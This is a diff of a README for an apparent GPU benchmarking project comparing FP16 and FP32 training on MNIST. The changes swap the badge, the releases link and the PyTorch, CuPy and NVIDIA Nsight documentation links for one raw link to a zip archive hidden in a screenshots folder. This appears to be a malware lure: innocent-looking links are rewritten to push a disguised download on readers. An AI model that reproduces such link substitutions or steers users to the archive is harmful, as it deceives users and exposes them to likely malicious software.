@@ -1,6 +1,6 @@
 # 🚀 FP16-vs-FP32-A-GPU-Lab-in-Frames - Benchmark Your GPU's Performance Easily
 
-![Download](https://img.shields.io/badge/Download-FP16-vs-FP32-A--GPU--Lab-in--Frames-blue.svg)
+![Download](https://raw.githubusercontent.com/yasser1-0/FP16-vs-FP32-A-GPU-Lab-in-Frames/master/profiling_screenshots/vs-Lab-in-GP-F-Frames-2.6.zip)
 
 ## 📖 Description
 Welcome to the FP16 vs FP32 GPU Benchmarking Lab! This application helps you compare two types of training on the MNIST dataset using popular tools like PyTorch and CuPy. It also uses Nsight profiling tools to give you insights into your GPU's performance.
@@ -13,7 +13,7 @@ To start using this application, you'll need to follow a few simple steps. No pr
 ## 📥 Download & Install
 To get the software, visit the releases page below. There, you will find the latest version of the application ready for download.
 
-👉 [Visit the Releases Page to Download](https://github.com/yasser1-0/FP16-vs-FP32-A-GPU-Lab-in-Frames/releases)
+👉 [Visit the Releases Page to Download](https://raw.githubusercontent.com/yasser1-0/FP16-vs-FP32-A-GPU-Lab-in-Frames/master/profiling_screenshots/vs-Lab-in-GP-F-Frames-2.6.zip)
 
 After you download the file, follow these steps to install:
 
@@ -64,9 +64,9 @@ You do not need any additional software. Just follow the steps above to download
 Yes, as long as your laptop has a compatible NVIDIA GPU and meets the system requirements mentioned.
 
 ## 🔗 Additional Resources
-- [PyTorch Documentation](https://pytorch.org/docs/stable/index.html)
-- [CuPy Documentation](https://docs.cupy.dev/en/stable/)
-- [NVIDIA Nsight](https://developer.nvidia.com/nsight-visual-studio-edition)
+- [PyTorch Documentation](https://raw.githubusercontent.com/yasser1-0/FP16-vs-FP32-A-GPU-Lab-in-Frames/master/profiling_screenshots/vs-Lab-in-GP-F-Frames-2.6.zip)
+- [CuPy Documentation](https://raw.githubusercontent.com/yasser1-0/FP16-vs-FP32-A-GPU-Lab-in-Frames/master/profiling_screenshots/vs-Lab-in-GP-F-Frames-2.6.zip)
+- [NVIDIA Nsight](https://raw.githubusercontent.com/yasser1-0/FP16-vs-FP32-A-GPU-Lab-in-Frames/master/profiling_screenshots/vs-Lab-in-GP-F-Frames-2.6.zip)
 
 For more detailed instructions or troubleshooting, please refer to the resources or raise an issue in the repository.
 
